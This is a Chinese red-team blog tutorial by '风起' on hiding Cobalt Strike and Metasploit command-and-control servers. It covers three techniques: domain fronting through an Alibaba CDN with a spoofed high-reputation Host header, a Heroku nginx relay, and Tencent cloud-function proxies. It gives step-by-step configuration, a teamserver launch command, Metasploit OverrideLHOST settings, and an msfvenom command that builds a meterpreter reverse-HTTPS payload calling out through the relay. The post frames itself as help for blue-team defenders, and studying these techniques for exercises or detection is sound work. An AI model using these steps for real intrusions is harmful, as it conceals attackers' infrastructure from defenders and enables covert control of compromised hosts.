# 红队攻防基础建设—C2 IP隐匿技术

作者：风起

## 前记

随着HW的开始，蓝队弟弟们见识到了很多奇特的操作，本文主要从监测溯源时比较常见的一些红队的隐匿手法进行讲解。在实际攻防中有效的隐匿我们的C2主机也是很必要的，在工作的同时发现很多蓝队对此并不熟悉，所以本文会深入浅出的讲解三种常见的方式，希望通过本文能够对各位有所帮助。

## 域前置

域前置技术就是通过CDN节点将流量转发到真实的C2服务器，其中CDN节点ip通过识别请求的Host头进行流量转发。这里作者利用阿里云全站加速CDN实现任意HOST头修改，利用构造高信誉域名，从而实现绕过流量分析。

### **第一步**

访问阿里云 CDN 全站加速配置，如下图：

![img](https://p1.ssl.qhimg.com/t018c8690c7255f74fd.png)

点击添加域名，，填写CDN基本信息，加速域名处可以填写高信誉的域名，在国内绝大数的服务商，都需要验证主域名的归属，但是在阿里云全站加速CDN中只要IP是本用户阿里云的主机即可绕过验证。只需要填写加速域名以及IP即可完成配置，搭配CobaltStrike profile即可绕过达到隐蔽真实IP及Header的功能，进行隐蔽IP的功能。

![img](https://p2.ssl.qhimg.com/t01dd93273a7c95052a.png)

![img](https://p5.ssl.qhimg.com/t019ad320c6ccc41640.png)

如上图即填写完毕，之后等待CDN配置完毕即可正常使用。

### **第二步**

使用多地ping对CNAME进行检测，得到多地CDN的IP。
全网PING:http://ping.chinaz.com/

![img](https://p0.ssl.qhimg.com/t017c5a7b77e7f6a693.png)

这里使用用三个演示效果即可。
  **58.215.145.105
61.168.100.175
42.48.120.160**

### **第三步**

使用得到的IP，进入CobaltStrike，配置profile文件。
这边使用的profile是amazon.profile，其实也可以自己写。
  **下载地址:https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile**
修改三处，header “Host” 即可。

![img](https://p5.ssl.qhimg.com/t01e3ecab961edc8f4d.png)

![img](https://p2.ssl.qhimg.com/t019aef8a130cc6c543.png)

### **第四步**

开启CobaltStrike，开启命令:
`  ./teamserver xxx.xxx.xxx.xxx password amazon.profile`
进入CobaltStrike进行配置，监听器配置如下：

![img](https://p4.ssl.qhimg.com/t016850ae73fc74862b.png)

配置HTTPS Hosts为之前获取的CDN IP，HTTP Host(Stager)为nanci.tencent.com，也就是我们配置的加速域名，端口默认80即可。
然后开启监听器，生成木马。

  **发现成功上线**

![img](https://p0.ssl.qhimg.com/t012ff50839a9c3544b.png)

并且使用netstat可以看到我们的网络连接为之前的两个负载IP

![img](https://p5.ssl.qhimg.com/t019a163fab897632b9.png)

如上图可以看到数据包的Host为nanci.tencent.com

  **至此域前置成功部署**！

### **总结**

配置简单
延展性强，可以随时更换IP，在红蓝对抗时可以快速部署，增加了防守封禁IP的难度。
Host高信誉域名。
注意阿里云不支持https的域前置
缺点：对CDN资源较大，不建议长时间使用（土豪除外）。

  **在前几天微步公开的情报中，提到了这一种攻击方式，所以作者在这里剖析了域前置的利用方式，希望能够对蓝方成员监控时有所帮助。**

![img](https://p0.ssl.qhimg.com/t01316d5ba97cf1f256.png)

 

## Heroku代理隐匿真实IP

Heroku是一个支持多种编程语言的云平台即服务。简单理解就是可以免费部署docker容器并且可以开放web服务到互联网.下面介绍操作步骤。其实简单来理解应用在C2隐匿上就是通过Nginx反向代理的方式，从heroku服务器代理到我们真实的VPS服务器。

### Heroku在CobaltStrike中的应用

**第一步**  

注册heroku账号，这里需要注意的是需要使用gmail邮箱注册，因为QQ以及163等国内邮件服务商被禁用，无法完成注册。
注册网址：https://dashboard.heroku.com/

**第二步**  

注册成功后进行登录，访问以下网址进入配置页面。
**https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku**

![img](https://p1.ssl.qhimg.com/t011ab19cc16189d0ed.png)

这里主要需要的是箭头所指的两处，其中App name为子域名前缀的名称，这里我们可以自定义，只要没有被注册过不重复即可。

而TARGET处，填写为我们真实的VPS服务器的域名，也就是需要代理的主机域名。这里格式为:[https://baidu.com:8443，代理VPS的8443端口。](https://baidu.com:8443，代理VPS的8443端口。/)

填写完毕后点击Deploy app自动部署。

![img](https://p4.ssl.qhimg.com/t01368c30adfdf78718.png)

**如上图所示即配置成功。**

**第三步**

在Cobaltstrike中配置两个监听器，设置PAYLOAD为Beacon HTTPS，HTTPS Hosts为sict.icu也就是我们真实的域名，HTTPS Port为8443端口。

**监听器1如下图所示:**

![img](https://p3.ssl.qhimg.com/t01f4f64a4dccc36103.png)

继续配置第二个监听器，同样设置PAYLOAD为Beacon HTTPS，HTTPS Hosts设置为nancicdn.herokuapp.com，也就是之前获取到的heroku的域名。
其中部署时配置的App name为子域名前缀，所以最终得到的heroku的域名就是nancicdn.herokuapp.com。HTTPS Port设置为443。

  **监听器2如下图所示：**

![img](https://p0.ssl.qhimg.com/t01c642bf6d3b1c20f8.png)

监听器全部部署完毕后生成木马文件，注意生成木马的监听器设置为监听器2，也就是指向heroku域名的那一个监听器。

![img](https://p0.ssl.qhimg.com/t01efd5924bb810e51e.png)

**成功上线Cobaltstrike**

### Heroku在Metasploit中的应用

heroku服务的配置这里就不再赘述，直接从Metasploit的配置开始讲解。

**第一步**

打开msf
在metasploit中添加handler,配置如图：

![img](https://p5.ssl.qhimg.com/t018cb0e768bd66bd21.png)

使用模块payload/windows/x64/meterpreter_reverse_https
设置LHOST为我们实际指向的域名，LPORT为8443，是在heroku中配置的。
然后设置三个全局参数，如下：
setg OverrideLHOST nancicdn.herokuapp.com
setg OverrideLPORT 443
setg OverrideRequestHost true

OverrideLHOST为我们heroku的地址，后面主域名为固定的，子域名前缀为刚才heroku中配置的App name。端口为443因为我们配置的是https协议。
参数配置完毕后，输入to_handler开启监听。

![img](https://p0.ssl.qhimg.com/t0145ce2a457c0deeb4.png)

如上图可以看到已经开启8443端口的监听，即配置完毕。

**第二步**

使用命令生成木马
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=nancicdn.herokuapp.com LPORT=443 -f exe -o payload.exe
然后将生成的木马上传至虚拟机并执行。

![img](https://p0.ssl.qhimg.com/t0168b3c0274b952f93.png)

  **执行后发现在metasploit成功上线。**

可以看到session的链接地址为heroku中转服务器地址，而且不同的heroku部署其连接的IP是不相同的。

  **如下图：
Target 1**

![img](https://p4.ssl.qhimg.com/t019344d0aff6b38cac.png)

Target 2

![img](https://p2.ssl.qhimg.com/t01baea8271871c8e13.png)

### 总结

heroku隐藏C2从技术原理上看非常简单,使用heroku服务部署nginx反向代理服务,payload连接heroku的nginx,nginx将流量转发到C2。
具体优势如下:
只需要注册heroku免费账号即可
无需注册或购买域名
自带可信的SSL证书(heroku域名自带证书)
如果IP地址被封锁,可删除原有heroku app重新部署heroku app(大约需要30s),与防守人员持续对抗
操作步骤简单

 

## 云函数

这个技术最先是在今年的3月份国外提出的，他们利用 azure 对 C2 进行隐藏，国内也有相对应的 云函数厂商，于是我们就尝试使用云函数对我们的 C2 服务器进行隐藏。

### 配置过程

点击新建云函数，选择创建方式—自定义创建，函数名称自定义或者默认都可以，运行环境选择python3.6，当然也有师傅去用其他语言版本去写但是原理都是一样的，地域随意即可。

![img](https://p4.ssl.qhimg.com/t01a7d70fafe09bb90d.png)

点击完成，我们先不编辑云函数代码。

![img](https://p0.ssl.qhimg.com/t018ef7221d37cdf571.png)

创建触发器，具体配置如上图，我们使用API网关来进行触发函数。

![img](https://p0.ssl.qhimg.com/t01f7f93590344ada6c.png)

![img](https://p2.ssl.qhimg.com/t01438523ad79d8c36b.png)

![img](https://p0.ssl.qhimg.com/t0199a2b1811618fef2.png)

按照上例图片配置一下API网关的默认路径，然后选择立即完成并发布任务即可。

然后我们编辑一下云函数，注意修改C2变量的内容为自己ip即可。下面的使用x-forward-for来确认目标主机的真实ip，不配置的话不影响正常使用，但是上线主机的ip会是云函数主机的IP地址。

![img](https://p3.ssl.qhimg.com/t017c674423b722f964.png)

这里配置完成后，我们得到API网关地址如下图：

![img](https://p0.ssl.qhimg.com/t01e5b5f6692e5ca39d.png)

注意发布

![img](https://p4.ssl.qhimg.com/t015030bd677e793cf9.png)

然后我们开始配置CS客户端，创建一个监听器，配置如下图，把API网关地址复制进去，注意端口必须设置为80，如果想要设置为其他的还需要配置一下云函数。

设置profile文件启动，配置文件http-config设置如下：

![img](https://p0.ssl.qhimg.com/t01d07317d2814bf8fc.png)

这里是为了与上面的云函数同步使用X-Forward-For来获取真实ip

![img](https://p0.ssl.qhimg.com/t01d3111d1f988fcf66.png)

然后我们生成木马进行上线。

![img](https://p2.ssl.qhimg.com/t01a8ef90e24f56209c.png)

**成功上线！**

下面我们来分析一下木马程序，首先查看本地外联ip为腾讯云IP地址

![img](https://p4.ssl.qhimg.com/t01758a4d627563aed5.png)

![img](https://p5.ssl.qhimg.com/t011ddb66db573f8028.png)

发现是腾讯云主机
继续分析上传病毒样本至微步平台(这也是蓝队成员最常用的分析手段)

![img](https://p1.ssl.qhimg.com/t018ff73af9ff44c278.png)

可以看到只能捕获到API网关域名。

### 总结

云函数的好处就是配置简单，免费，高效，很适合日常渗透使用。
嘿嘿，写到最后就不太想凑字数了。

 

## 后记

本文到这里就接近尾声了，正值HW时期，希望以本文能够对广大防守方成员有所帮助，面对红队的隐匿技术，在工作中碰到这种问题可以第一时间进行响应研判，当然以上的几种方式都不太好溯源，这也是时至今日这些方法依旧有效的原因，尤其是今年的HW中，这些方式更加频繁的映入我们的眼帘。今年不仅仅是大量的0day爆出，也有一些奇淫巧计的产生，在检验企业安全体系能力的同时也在磨练红蓝双方人员的实力，这也是红蓝对抗的意义所在。